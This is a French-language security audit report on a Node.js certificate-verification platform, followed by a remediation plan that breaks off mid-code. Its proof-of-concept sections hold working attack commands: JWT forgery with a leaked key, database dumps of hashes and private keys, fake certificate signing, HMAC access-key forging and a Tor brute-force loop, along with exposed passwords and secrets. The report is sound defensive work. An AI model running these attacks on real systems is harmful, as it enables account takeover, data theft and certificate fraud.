# 🔴 RAPPORT D'AUDIT DE SÉCURITÉ OFFENSIF — CertiVerify

**Date :** 2026-05-11  
**Auditeur :** Pentester Senior (OWASP Top 10)  
**Cible :** CertiVerify — Plateforme de certification numérique  
**Stack :** Node.js/Express, PostgreSQL/Prisma, React/Vite  
**Verdict global : 🔴 CRITIQUE — Plusieurs failles exploitables immédiatement**

---

## TABLE DES MATIÈRES

| # | Faille | Sévérité |
|---|--------|----------|
| 1 | Clé privée RSA et secrets committés dans Git | 🔴 Critique |
| 2 | Fichier `.env` avec credentials en production dans Git | 🔴 Critique |
| 3 | Clé privée RSA stockée en clair dans la base de données | 🔴 Critique |
| 4 | Mots de passe par défaut faibles dans le Seed | 🔴 Critique |
| 5 | Auto-validation des modules par l'étudiant (Logique Métier) | 🔴 Critique |
| 6 | IDOR sur le endpoint `GET /api/certificates/:id` (rôle verifier) | 🟠 Haute |
| 7 | Absence de vérification d'institution croisée (Admin) | 🟠 Haute |
| 8 | AccessKey déterministe et brute-forceable | 🟠 Haute |
| 9 | Absence de protection CSRF sur les mutations | 🟡 Moyenne |
| 10 | Absence de cookie-parser sur la route `/refresh` | 🟡 Moyenne |
| 11 | HMAC QR tronqué à 16 hex (64 bits) | 🟡 Moyenne |
| 12 | Fuite d'information dans les erreurs (mode dev) | 🟡 Moyenne |
| 13 | Pas d'expiration sur les Refresh Tokens | 🟡 Moyenne |
| 14 | Credentials de test exposés dans le frontend | 🟢 Faible |
| 15 | Rate-limit basé uniquement sur IP (contournable) | 🟢 Faible |

---

## FAILLE 1 — Clé privée RSA JWT committée dans Git

**Sévérité : 🔴 CRITIQUE**

### Description technique

Le fichier `server/keys/jwt-private.pem` est tracké par Git et contient la clé privée RSA-2048 utilisée pour signer tous les JWT. Quiconque clone le dépôt peut forger des tokens d'accès administrateur.

**Fichier :** `server/keys/jwt-private.pem` (tracké dans Git)  
**Preuve :** `git ls-files -- server/keys/` retourne les deux fichiers PEM.

### POC d'Attaque

```bash
# 1. Cloner le dépôt (la clé privée est dedans)
git clone <REPO_URL>

# 2. Forger un JWT admin avec Node.js
node -e "
const jwt = require('jsonwebtoken');
const fs = require('fs');
const privateKey = fs.readFileSync('server/keys/jwt-private.pem');
const token = jwt.sign({
  id: '00000000-0000-0000-0000-000000000001',
  email: 'attacker@evil.com',
  role: 'admin',
  institutionId: null
}, privateKey, { algorithm: 'RS256', expiresIn: '24h' });
console.log(token);
"

# 3. Utiliser le token forgé pour accéder à toutes les routes admin
curl -H "Authorization: Bearer <TOKEN_FORGÉ>" http://localhost:3001/api/users
curl -H "Authorization: Bearer <TOKEN_FORGÉ>" http://localhost:3001/api/certificates
```

### Impact
- **Usurpation totale d'identité** : un attaquant peut se faire passer pour n'importe quel utilisateur admin
- **Émission de faux certificats**, révocation de certificats légitimes
- **Accès à toutes les données utilisateurs**

### Remédiation

```bash
# 1. Supprimer les clés du dépôt et de l'historique Git
git rm --cached server/keys/jwt-private.pem server/keys/jwt-public.pem
echo "server/keys/*.pem" >> .gitignore
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch server/keys/jwt-private.pem' HEAD

# 2. Régénérer immédiatement les clés
openssl genrsa -out server/keys/jwt-private.pem 2048
openssl rsa -in server/keys/jwt-private.pem -pubout -out server/keys/jwt-public.pem

# 3. Invalider toutes les sessions existantes (flush refresh tokens en DB)
```

---

## FAILLE 2 — Fichier `.env` avec credentials DB dans Git

**Sévérité : 🔴 CRITIQUE**

### Description technique

`server/.env` est tracké dans Git avec les identifiants PostgreSQL, le secret HMAC, et les chemins de clés. Le `.gitignore` contient `.env*` à la racine mais le fichier `server/.env` a été ajouté manuellement.

**Fichier :** `server/.env` (tracké)  
**Contenu sensible exposé :**
- `DATABASE_URL=postgresql://certi:certipass@localhost:5432/certiverify`
- `QR_HMAC_SECRET=supersecret_hmac_key_with_min_32_chars_123456`
- `ACCESS_KEY_SECRET=change-this-to-another-64-char-hex-secret`

### POC d'Attaque

```bash
# Accéder directement à la base de données avec les credentials exposés
psql postgresql://certi:certipass@<SERVER_IP>:5432/certiverify

# Extraire tous les mots de passe hashés
SELECT email, password_hash, role FROM users;

# Extraire les clés privées des institutions
SELECT institution_id, private_key_ref FROM key_pairs;

# Forger des access keys car le QR_HMAC_SECRET est connu
node -e "
const crypto = require('crypto');
const secret = 'supersecret_hmac_key_with_min_32_chars_123456';
const accessKey = crypto.createHmac('sha256', secret)
  .update('CERTUID01:student-uuid:access').digest('hex').substring(0,16);
console.log('Access Key:', accessKey);
"
```

### Impact
- **Accès direct à la base de données** si le port 5432 est exposé
- **Capacité de forger des access keys et signatures QR** car le HMAC secret est connu
- **Compromission de toute la chaîne de confiance cryptographique**

### Remédiation

```bash
git rm --cached server/.env
echo "server/.env" >> server/.gitignore
# Changer TOUS les secrets en production
# Utiliser un gestionnaire de secrets (Vault, AWS Secrets Manager)
```

---

## FAILLE 3 — Clé privée RSA d'institution stockée en clair en BDD

**Sévérité : 🔴 CRITIQUE**

### Description technique

Dans `server/prisma/seed.ts` (ligne 41) et `keypair.repository.ts`, la clé privée RSA de l'institution est stockée en clair dans le champ `private_key_ref` de la table `key_pairs`. Le commentaire dit "En prod: référence HSM/Vault" mais aucune abstraction n'existe.

**Fichier :** `server/prisma/seed.ts:41`
```typescript
privateKeyRef: privateKey, // In prod: this would be a HSM reference
```

**Fichier :** `server/src/services/crypto.service.ts:101`
```typescript
export function signHash(hash: string, privateKeyPem: string): string {
  const signer = crypto.createSign('RSA-SHA256');
  signer.update(hash);
  return signer.sign(privateKeyPem, 'base64'); // Clé PEM brute utilisée directement
}
```

### POC d'Attaque

```sql
-- Avec un accès DB (cf. Faille 2), extraire la clé privée
SELECT private_key_ref FROM key_pairs WHERE is_active = true;

-- L'attaquant peut maintenant signer des certificats frauduleux
```

```python
import hashlib, json, base64
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

# Charger la clé volée
private_key = serialization.load_pem_private_key(STOLEN_KEY, password=None)

# Créer un faux certificat
payload = json.dumps({"certificateUid":"FAKE12345","institutionId":"...","studentId":"...","studentName":"Fake Student","title":"Fake Degree","issuedAt":"2026-01-01"}, sort_keys=True)
doc_hash = hashlib.sha256(payload.encode()).hexdigest()
signature = private_key.sign(doc_hash.encode(), padding.PKCS1v15(), hashes.SHA256())
print("Faux certificat signé avec succès!")
```

### Impact
- **Émission de certificats frauduleux indétectables** car signés avec la vraie clé
- **Destruction totale de la confiance** dans tous les certificats émis

### Remédiation

```typescript
// Utiliser un HSM ou au minimum chiffrer la clé avec AES-256-GCM
import crypto from 'node:crypto';

function encryptPrivateKey(pem: string, masterKey: Buffer): string {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', masterKey, iv);
  const encrypted = Buffer.concat([cipher.update(pem), cipher.final()]);
  const tag = cipher.getAuthTag();
  return JSON.stringify({ iv: iv.toString('hex'), tag: tag.toString('hex'), data: encrypted.toString('hex') });
}
```

---

## FAILLE 4 — Mots de passe par défaut faibles dans le Seed

**Sévérité : 🔴 CRITIQUE**

### Description technique

Le seed (`server/prisma/seed.ts`) et le script de setup (`setup-server.sh`) affichent en clair les identifiants par défaut :
- Admin: `admin@certiverify.com` / `admin123`
- Student: `jean@student.com` / `student123`

Ces mots de passe ne respectent pas la complexité minimale (8 chars sans majuscule/chiffre spécial).

### POC d'Attaque

```bash
# Connexion directe avec les credentials par défaut
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@certiverify.com","password":"admin123"}'

# Réponse : accessToken + session admin complète
```

### Impact
- **Accès admin immédiat** si les mots de passe seed ne sont pas changés en production

### Remédiation

```typescript
// Forcer un changement de mot de passe au premier login
// Générer des mots de passe aléatoires pour le seed
const adminPassword = crypto.randomBytes(16).toString('base64url');
console.log(`Admin temp password: ${adminPassword}`);
```

---

## FAILLE 5 — Auto-validation des modules par l'étudiant (Faille Logique Métier)

**Sévérité : 🔴 CRITIQUE**

### Description technique

La route `POST /api/modules/:id/complete` permet à un étudiant authentifié de marquer ses propres modules comme "completed" **sans aucune validation externe** (note, examen, validation admin). Quand tous les modules sont complétés, un certificat est automatiquement émis via `autoIssueIfReady()`.

**Fichier :** `server/src/routes/module.routes.ts:63`
```typescript
// Aucun requireRole('admin') — tout étudiant authentifié peut appeler
router.post('/:id/complete', validate({ params: uuidParam }), moduleController.complete);
```

**Fichier :** `server/src/controllers/module.controller.ts:108-131`
```typescript
// Vérifie seulement que l'utilisateur est 'student', pas de validation externe
if (req.user!.role !== 'student') { ... }
const result = await moduleService.completeModule(userId, moduleId, req.user!.id);
// → appelle autoIssueIfReady() qui émet automatiquement un certificat signé
```

### POC d'Attaque

```bash
# 1. Se connecter comme étudiant
TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jean@student.com","password":"student123"}' | jq -r '.data.accessToken')

# 2. Lister les modules
MODULES=$(curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3001/api/modules | jq -r '.data[].id')

# 3. S'inscrire puis compléter chaque module sans rien apprendre
for MODULE_ID in $MODULES; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    http://localhost:3001/api/modules/$MODULE_ID/enroll
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    http://localhost:3001/api/modules/$MODULE_ID/complete
done

# 4. Un certificat signé RSA est automatiquement émis! 🎓💀
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3001/api/certificates
```

### Impact
- **N'importe quel étudiant peut obtenir un certificat signé cryptographiquement** en quelques secondes
- **Destruction de la valeur du certificat** : pas de vérification académique réelle

### Remédiation

```typescript
// Retirer la route auto-complete pour les étudiants
// Seul un admin devrait valider la complétion
router.post('/:id/complete', requireRole('admin'), validate({ params: uuidParam }), moduleController.complete);

// Ou ajouter un système de quiz/examen obligatoire
```

---

## FAILLE 6 — IDOR sur `GET /api/certificates/:id` (rôle verifier)

**Sévérité : 🟠 HAUTE**

### Description technique

Le contrôleur `getById` vérifie l'accès uniquement pour le rôle `student`. Un utilisateur avec le rôle `verifier` peut accéder à **n'importe quel certificat** par son UUID sans restriction.

**Fichier :** `server/src/controllers/certificate.controller.ts:70-91`
```typescript
// Seul 'student' est vérifié — 'verifier' passe sans contrôle
if (req.user!.role === 'student' && cert.studentId !== req.user!.id) {
  res.status(403).json({ success: false, error: 'Accès interdit' });
  return;
}
```

### POC d'Attaque

```bash
# Créer un compte verifier, puis itérer sur les UUIDs
curl -s -H "Authorization: Bearer $VERIFIER_TOKEN" \
  http://localhost:3001/api/certificates/<UUID_DEVINÉ>
```

### Impact
- **Accès à toutes les données de certificats** (noms, institutions, hashes)

### Remédiation

```typescript
if (req.user!.role !== 'admin') {
  if (req.user!.role === 'student' && cert.studentId !== req.user!.id) {
    res.status(403).json({ success: false, error: 'Accès interdit' });
    return;
  }
  if (req.user!.role === 'verifier') {
    // Limiter aux données publiques de vérification uniquement
    const { accessKey, digitalSignature, canonicalData, ...publicData } = cert;
    res.json({ success: true, data: publicData });
    return;
  }
}
```

---

## FAILLE 7 — Absence de vérification d'institution croisée (Admin)

**Sévérité : 🟠 HAUTE**

### Description technique

Un admin de l'institution A peut émettre des certificats pour des étudiants de l'institution B en fournissant un `institutionId` arbitraire dans le body.

**Fichier :** `server/src/controllers/certificate.controller.ts:15`
```typescript
institutionId: req.body.institutionId || req.user!.institutionId!,
// Si un admin fournit un institutionId différent du sien, aucune vérification
```

Le même problème existe pour les modules (`module.controller.ts:29`).

### POC d'Attaque

```bash
curl -X POST http://localhost:3001/api/certificates \
  -H "Authorization: Bearer $ADMIN_TOKEN_INST_A" \
  -H "Content-Type: application/json" \
  -d '{"studentId":"<UUID_STUDENT_INST_B>","institutionId":"<UUID_INST_B>","title":"Fake"}'
```

Note : `certificate.service.ts:45` vérifie que le student appartient à l'institution cible, mais un admin peut quand même créer des modules dans une autre institution.

### Impact
- **Modules et ressources créés dans des institutions étrangères**

### Remédiation

```typescript
// Forcer l'institutionId de l'admin connecté
const institutionId = req.user!.institutionId;
if (!institutionId) throw new ForbiddenError('Admin sans institution');
```

---

## FAILLE 8 — AccessKey déterministe et brute-forceable

**Sévérité : 🟠 HAUTE**

### Description technique

L'access key est un HMAC-SHA256 tronqué à 16 hex chars (64 bits). Comme le `QR_HMAC_SECRET` est connu (Faille 2), un attaquant peut calculer l'access key de n'importe quel certificat.

**Fichier :** `server/src/services/crypto.service.ts:216-221`
```typescript
export function generateAccessKey(certificateUid: string, studentId: string): string {
  return crypto.createHmac('sha256', env.QR_HMAC_SECRET) // Secret connu!
    .update(`${certificateUid}:${studentId}:access`)
    .digest('hex').substring(0, 16);
}
```

### POC d'Attaque

```bash
# Connaissant le HMAC secret, le certificateUid et le studentId :
node -e "
const crypto = require('crypto');
const key = crypto.createHmac('sha256','supersecret_hmac_key_with_min_32_chars_123456')
  .update('CERTUID01:<student-uuid>:access').digest('hex').substring(0,16);
console.log(key);
"

# Télécharger le certificat sans authentification
curl http://localhost:3001/api/certificates/CERTUID01/download?key=<CALCULATED_KEY>
```

### Impact
- **Téléchargement de tout certificat** sans authentification

### Remédiation

```typescript
// Utiliser un secret dédié (ACCESS_KEY_SECRET séparé du QR_HMAC_SECRET)
// Stocker l'access key hashé en base au lieu de le recalculer
// Augmenter la taille à 32 hex chars minimum
```

---

## FAILLE 9 — Absence de protection CSRF sur les mutations

**Sévérité : 🟡 MOYENNE**

### Description technique

Les routes POST/PUT/DELETE n'ont pas de token CSRF. Le cookie `SameSite=Strict` sur le refresh token atténue le risque, mais le token d'accès est envoyé via header `Authorization` (pas de cookie), ce qui rend l'attaque plus complexe mais pas impossible si un XSS est trouvé.

### Impact
- **Risque mitigé** par l'architecture Bearer token, mais aucune défense en profondeur

### Remédiation

```typescript
import csrf from 'csurf';
app.use(csrf({ cookie: { httpOnly: true, sameSite: 'strict' } }));
```

---

## FAILLE 10 — Doublon de `QR_HMAC_SECRET` avec valeurs contradictoires dans `.env`

**Sévérité : 🟡 MOYENNE**

### Description technique

Le fichier `server/.env` définit `QR_HMAC_SECRET` **deux fois** avec des valeurs différentes :
- Ligne 6 : `QR_HMAC_SECRET=supersecret_hmac_key_with_min_32_chars_123456`
- Ligne 19 : `QR_HMAC_SECRET=change-this-to-a-64-char-hex-secret`

`dotenv` utilise la première valeur, ce qui signifie que le secret "de production" n'est jamais appliqué.

### Impact
- **Secret HMAC prévisible** utilisé même si l'opérateur pense l'avoir changé

### Remédiation

Supprimer le doublon et utiliser un vrai secret aléatoire.

---

## FAILLE 11 — HMAC QR tronqué à 64 bits

**Sévérité : 🟡 MOYENNE**

### Description technique

**Fichier :** `server/src/services/crypto.service.ts:165`
```typescript
.digest('hex').substring(0, 16); // 16 hex = 64 bits seulement
```

64 bits est en-dessous du seuil recommandé de 128 bits pour les MACs.

### Remédiation

```typescript
.digest('hex').substring(0, 32); // 128 bits minimum
```

---

## FAILLE 12 — Fuite d'information en mode développement

**Sévérité : 🟡 MOYENNE**

### Description technique

**Fichier :** `server/src/middleware/error.handler.ts:44-45`
```typescript
error: env.NODE_ENV === 'production' ? 'Erreur interne' : err.message,
...(env.NODE_ENV === 'development' && { stack: err.stack }),
```

En mode dev (défaut), les stack traces et messages d'erreur internes sont renvoyés au client, révélant les chemins de fichiers, les noms de tables Prisma, etc.

### Remédiation

Ne **jamais** exposer `err.stack` même en dev via l'API. Logger côté serveur uniquement.

---

## FAILLE 13 — Pas d'expiration sur les Refresh Tokens

**Sévérité : 🟡 MOYENNE**

### Description technique

Le refresh token est stocké hashé en base mais **n'a pas de champ `expiresAt`**. Le cookie a un `maxAge` de 7 jours, mais côté serveur rien n'empêche un token volé d'être utilisé indéfiniment tant qu'il reste en base.

**Fichier :** `server/prisma/schema.prisma:53`
```prisma
refreshToken  String?   @map("refresh_token") @db.VarChar(512)
// Pas de champ refreshTokenExpiresAt
```

### Remédiation

```prisma
refreshToken          String?   @map("refresh_token") @db.VarChar(512)
refreshTokenExpiresAt DateTime? @map("refresh_token_expires_at") @db.Timestamptz
```

---

## FAILLE 14 — Credentials de test exposés dans le frontend

**Sévérité : 🟢 FAIBLE**

### Description technique

**Fichier :** `src/pages/Login.tsx:133-141`
```tsx
{import.meta.env.DEV && (
  <div>
    <p>Email: admin@certiverify.com</p>
    <p>Pass: admin123</p>
  </div>
)}
```

La garde `import.meta.env.DEV` est fiable en build mais les credentials sont en clair dans le code source.

### Remédiation

Déplacer ces informations dans un fichier `.env.development` non tracké.

---

## FAILLE 15 — Rate-limit contournable (IP uniquement)

**Sévérité : 🟢 FAIBLE**

### Description technique

Le rate limiting est basé uniquement sur l'adresse IP. Derrière un proxy ou via rotation d'IP (Tor, VPN), les limites sont contournables.

### POC d'Attaque

```bash
# Brute-force distribué via Tor
for i in $(seq 1 1000); do
  torsocks curl -s -X POST http://target:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@certiverify.com\",\"password\":\"pass$i\"}"
done
```

### Remédiation

```typescript
// Combiner IP + email pour le rate limiting auth
const authLimiter = rateLimit({
  windowMs: 900_000,
  max: 5,
  keyGenerator: (req) => `${req.ip}:${req.body?.email || 'unknown'}`,
});
```

---

## RÉSUMÉ EXÉCUTIF

| Catégorie OWASP | Failles trouvées | Sévérité max |
|---|---|---|
| A01 - Broken Access Control | #5, #6, #7 | 🔴 Critique |
| A02 - Cryptographic Failures | #1, #2, #3, #8, #11 | 🔴 Critique |
| A04 - Insecure Design | #4, #5, #10 | 🔴 Critique |
| A05 - Security Misconfiguration | #2, #12, #14 | 🔴 Critique |
| A07 - Identification & Auth Failures | #4, #13, #15 | 🔴 Critique |
| A08 - Software & Data Integrity | #3 | 🔴 Critique |

### Priorités de remédiation immédiates

1. **URGENT** : Retirer `server/.env`, `server/keys/*.pem` du dépôt Git et purger l'historique
2. **URGENT** : Régénérer TOUTES les clés et secrets (JWT, HMAC, DB password)
3. **URGENT** : Supprimer la route `POST /api/modules/:id/complete` pour les étudiants
4. **HAUTE** : Chiffrer les clés privées en base (AES-256-GCM) ou utiliser un HSM
5. **HAUTE** : Ajouter des vérifications d'institution croisée sur toutes les routes admin
6. **HAUTE** : Ajouter une expiration côté serveur aux refresh tokens

> ⚠️ **Ce rapport démontre que la chaîne de confiance cryptographique de CertiVerify est entièrement compromettable** par un attaquant ayant accès au dépôt Git public. Les failles #1, #2 et #3 combinées permettent de forger des certificats indistinguables des vrais.

---
---

# 🛡️ PLAN DE REMÉDIATION COMPLET — GUIDE ÉTAPE PAR ÉTAPE

> Ce plan est ordonné par **priorité d'exécution**. Chaque étape doit être complétée avant de passer à la suivante. Les étapes sont regroupées en 5 phases.

---

## PHASE 1 — URGENCE IMMÉDIATE (Jour 1) : Purger les secrets du dépôt Git

> Ces étapes doivent être exécutées **immédiatement** car les secrets sont publiquement accessibles.

### Étape 1.1 — Retirer les fichiers sensibles du suivi Git

```bash
cd /home/nilova/Documents/ProjetSecuriteWeb-CertyVerify

# Retirer le .env et les clés du suivi Git (sans supprimer les fichiers locaux)
git rm --cached server/.env
git rm --cached server/keys/jwt-private.pem
git rm --cached server/keys/jwt-public.pem
```

### Étape 1.2 — Mettre à jour le `.gitignore`

Remplacer le contenu de `.gitignore` par :

```gitignore
node_modules/
build/
dist/
coverage/
.DS_Store
*.log

# Secrets — JAMAIS committés
.env
.env.*
!.env.example
server/.env
server/.env.*
!server/.env.example
server/keys/*.pem
```

### Étape 1.3 — Purger l'historique Git des secrets

```bash
# Installer git-filter-repo (plus sûr que filter-branch)
pip install git-filter-repo

# Purger les fichiers sensibles de TOUT l'historique
git filter-repo --invert-paths \
  --path server/.env \
  --path server/keys/jwt-private.pem \
  --path server/keys/jwt-public.pem \
  --force

# Force push vers le dépôt distant
git push origin main --force
```

### Étape 1.4 — Régénérer TOUTES les clés et secrets

```bash
# 1. Nouvelles clés JWT RSA-2048
openssl genrsa -out server/keys/jwt-private.pem 4096
openssl rsa -in server/keys/jwt-private.pem -pubout -out server/keys/jwt-public.pem

# 2. Nouveau secret HMAC (64 caractères hex aléatoires)
NEW_HMAC=$(openssl rand -hex 32)
echo "Nouveau QR_HMAC_SECRET: $NEW_HMAC"

# 3. Nouveau secret pour les access keys
NEW_ACCESS=$(openssl rand -hex 32)
echo "Nouveau ACCESS_KEY_SECRET: $NEW_ACCESS"

# 4. Nouveau mot de passe PostgreSQL
NEW_DB_PASS=$(openssl rand -base64 24)
echo "Nouveau DB password: $NEW_DB_PASS"
```

### Étape 1.5 — Recréer le fichier `server/.env` avec les nouveaux secrets

```bash
cat > server/.env << 'EOF'
NODE_ENV=development
PORT=3001
DATABASE_URL=postgresql://certi:<NOUVEAU_MOT_DE_PASSE>@localhost:5432/certiverify

# JWT RSA
JWT_PRIVATE_KEY_PATH=./keys/jwt-private.pem
JWT_PUBLIC_KEY_PATH=./keys/jwt-public.pem
JWT_ACCESS_EXPIRY=15m

# Security — Générés avec openssl rand -hex 32
BCRYPT_ROUNDS=12
QR_HMAC_SECRET=<NOUVEAU_HMAC_64_HEX>
ACCESS_KEY_SECRET=<NOUVEAU_ACCESS_64_HEX>

# CORS
CORS_ORIGIN=http://localhost:3000,http://localhost:5173

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX=100
EOF
```

### Étape 1.6 — Créer un vrai `.env.example` pour le serveur

```bash
cat > server/.env.example << 'EOF'
NODE_ENV=development
PORT=3001
DATABASE_URL=postgresql://user:password@localhost:5432/certiverify
JWT_PRIVATE_KEY_PATH=./keys/jwt-private.pem
JWT_PUBLIC_KEY_PATH=./keys/jwt-public.pem
JWT_ACCESS_EXPIRY=15m
BCRYPT_ROUNDS=12
QR_HMAC_SECRET=generate-with-openssl-rand-hex-32
ACCESS_KEY_SECRET=generate-with-openssl-rand-hex-32
CORS_ORIGIN=http://localhost:3000
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX=100
EOF
```

### Étape 1.7 — Invalider toutes les sessions existantes

```sql
-- Connectez-vous à PostgreSQL et invalidez tous les refresh tokens
UPDATE users SET refresh_token = NULL;
```

### Étape 1.8 — Committer et pusher

```bash
git add .gitignore server/.env.example
git commit -m "security: purge secrets, regenerate all keys and tokens"
git push origin main
```

---

## PHASE 2 — CORRECTIONS CRITIQUES (Jour 1-2) : Logique métier et accès

### Étape 2.1 — Bloquer l'auto-validation des modules par les étudiants (Faille #5)

**Fichier : `server/src/routes/module.routes.ts`**

Remplacer la ligne 63 :
```typescript
// AVANT (vulnérable) :
router.post('/:id/complete', validate({ params: uuidParam }), moduleController.complete);

// APRÈS (corrigé) — seul un admin peut valider la complétion :
router.post('/:id/complete', requireRole('admin'), validate({ params: uuidParam }), moduleController.complete);
```

**Fichier : `server/src/controllers/module.controller.ts`**

Remplacer la fonction `complete` (lignes 108-131) :
```typescript
export async function complete(req: Request, res: Response, next: NextFunction) {
  try {
    // Seul un admin peut marquer un module comme complété
    // Le studentId doit être fourni dans le body
    const { studentId } = req.body;
    if (!studentId) {
      res.status(400).json({ success: false, error: 'studentId requis' });
      return;
    }

    const moduleId = req.params.id;
    const result = await moduleService.completeModule(studentId, moduleId, req.user!.id);

    await auditService.logAudit({
      userId: req.user!.id,
      action: 'module.completed',
      resourceType: 'user_module',
      details: { moduleId, studentId, approvedBy: req.user!.id },
      ipAddress: req.ip,
    });

    res.json({ success: true, data: result });
  } catch (err) {
    next(err);
  }
}
```

### Étape 2.2 — Corriger l'IDOR sur les certificats (Faille #6)

**Fichier : `server/src/controllers/certificate.controller.ts`**

Remplacer le bloc de vérification dans `getById` (lignes 74-78) :
```typescript
// Contrôle d'accès selon le rôle
if (req.user!.role === 'student' && cert.studentId !== req.user!.id) {
  res.status(403).json({ success: false, error: 'Accès interdit' });
  return;
}
if (req.user!.role === 'verifier') {
  // Les vérificateurs ne voient que les données publiques
  const { accessKey: _a, digitalSignature: _d, canonicalData: _c, ...publicData } = cert;
  const qrPayload = cryptoService.generateSecureQRPayload(cert.certificateUid, env.CORS_ORIGIN);
  res.json({ success: true, data: { ...publicData, qrPayload } });
  return;
}
```

Appliquer la même logique dans `downloadPdf` (lignes 97-100).

### Étape 2.3 — Forcer l'institution de l'admin connecté (Faille #7)

**Fichier : `server/src/controllers/certificate.controller.ts`**

Remplacer la ligne 15 dans `issue` :
```typescript
// AVANT :
institutionId: req.body.institutionId || req.user!.institutionId!,

// APRÈS — toujours forcer l'institution de l'admin :
institutionId: req.user!.institutionId!,
```

**Fichier : `server/src/controllers/module.controller.ts`**

Remplacer la ligne 29 dans `create` :
```typescript
// AVANT :
const institutionId = req.body.institutionId || req.user!.institutionId;

// APRÈS :
const institutionId = req.user!.institutionId;
if (!institutionId) {
  res.status(403).json({ success: false, error: 'Admin sans institution associée' });
  return;
}
```

### Étape 2.4 — Séparer les secrets HMAC et Access Key (Faille #8)

**Fichier : `server/src/config/env.ts`**

Ajouter `ACCESS_KEY_SECRET` au schéma Zod :
```typescript
const envSchema = z.object({
  // ... existant ...
  QR_HMAC_SECRET: z.string().min(32),
  ACCESS_KEY_SECRET: z.string().min(32),  // NOUVEAU — secret dédié aux access keys
  // ...
});
```

**Fichier : `server/src/services/crypto.service.ts`**

Modifier `generateAccessKey` et `verifyAccessKey` :
```typescript
export function generateAccessKey(certificateUid: string, studentId: string): string {
  return crypto
    .createHmac('sha256', env.ACCESS_KEY_SECRET)  // Secret DÉDIÉ
    .update(`${certificateUid}:${studentId}:access`)
    .digest('hex')
    .substring(0, 32);  // 128 bits au lieu de 64
}

export function verifyAccessKey(certificateUid: string, studentId: string, providedKey: string): boolean {
  try {
    const expected = generateAccessKey(certificateUid, studentId);
    if (providedKey.length !== expected.length) return false;
    return crypto.timingSafeEqual(Buffer.from(providedKey, 'utf8'), Buffer.from(expected, 'utf8'));
  } catch {
    return false;
  }
}
```

---

## PHASE 3 — RENFORCEMENT CRYPTOGRAPHIQUE (Jour 2-3)

### Étape 3.1 — Chiffrer les clés privées d'institution en base (Faille #3)

**Créer un nouveau fichier : `server/src/services/keyEncryption.service.ts`**

```typescript
import crypto from 'node:crypto';
import { env } from '../config/env.js';

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const TAG_LENGTH = 16;

function getMasterKey(): Buffer {
  // En production, ce master key devrait venir d'un HSM ou d'une variable d'env sécurisée
  return crypto.createHash('sha256').update(env.ACCESS_KEY_SECRET).digest();
}

/** Chiffre une clé PEM avant stockage en base */
export function encryptPrivateKey(pemContent: string): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv(ALGORITHM, getMasterKey(), iv);
  const encrypted = Buffer.concat([cipher.update(pemContent, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return JSON.stringify({
    iv: iv.toString('hex'),
    tag: tag.toString('hex'),
    data: encrypted.toString('hex'),
  });
}

/** Déchiffre une clé PEM depuis la base */
export function decryptPrivateKey(encryptedJson: string): string {
  const { iv, tag, data } = JSON.parse(encryptedJson);
  const decipher = crypto.createDecipheriv(ALGORITHM, getMasterKey(), Buffer.from(iv, 'hex'));
  decipher.setAuthTag(Buffer.from(tag, 'hex'));
  return Buffer.concat([decipher.update(Buffer.from(data, 'hex')), decipher.final()]).toString('utf8');
}
```

**Modifier `server/src/services/certificate.service.ts`** — importer et utiliser le déchiffrement :

```typescript
import { decryptPrivateKey } from './keyEncryption.service.js';

// Dans issueCertificate(), remplacer l'appel à signHash :
const decryptedKey = decryptPrivateKey(keyPair.privateKeyRef);
const digitalSignature = cryptoService.signHash(documentHash, decryptedKey);
```

**Modifier `server/prisma/seed.ts`** — chiffrer la clé au seed :

```typescript
import { encryptPrivateKey } from '../src/services/keyEncryption.service.js';

// Remplacer la ligne 41 :
privateKeyRef: encryptPrivateKey(privateKey),
```

### Étape 3.2 — Augmenter la taille du HMAC QR à 128 bits (Faille #11)

**Fichier : `server/src/services/crypto.service.ts`**

```typescript
// Dans generateSecureQRPayload() — ligne 165 :
// AVANT :
.substring(0, 16);

// APRÈS :
.substring(0, 32);

// Dans verifyQRSignature() — ligne 189 :
// AVANT :
.substring(0, 16);

// APRÈS :
.substring(0, 32);
```

### Étape 3.3 — Migrer vers RSA-4096 pour les clés JWT

Les clés ont déjà été régénérées en 4096 bits à l'étape 1.4. Aucun changement de code nécessaire car `jsonwebtoken` gère automatiquement la taille de clé.

---

## PHASE 4 — RENFORCEMENT AUTHENTIFICATION (Jour 3-4)

### Étape 4.1 — Ajouter une expiration serveur aux refresh tokens (Faille #13)

**Fichier : `server/prisma/schema.prisma`**

Ajouter le champ après `refreshToken` :
```prisma
model User {
  // ... existant ...
  refreshToken          String?   @map("refresh_token") @db.VarChar(512)
  refreshTokenExpiresAt DateTime? @map("refresh_token_expires_at") @db.Timestamptz
  // ...
}
```

Appliquer la migration :
```bash
cd server && npx prisma migrate dev --name add_refresh_token_expiry
```

**Fichier : `server/src/services/auth.service.ts`**

Modifier toutes les fonctions qui écrivent un refresh token :
```typescript
const REFRESH_TOKEN_DURATION_MS = 7 * 24 * 60 * 60 * 1000; // 7 jours

// Dans login() et register(), remplacer l'update du refreshToken :
await userRepo.update(user.id, {
  lastLoginAt: new Date(),
  refreshToken: hashRefreshToken(refreshToken),
  refreshTokenExpiresAt: new Date(Date.now() + REFRESH_TOKEN_DURATION_MS),
});

// Dans refreshAccessToken(), ajouter la vérification d'expiration :
export async function refreshAccessToken(refreshToken: string): Promise<TokenPair> {
  const hashedToken = hashRefreshToken(refreshToken);
  const user = await userRepo.findByRefreshToken(hashedToken);

  if (!user) {
    throw new UnauthorizedError('Refresh token invalide ou expiré');
  }

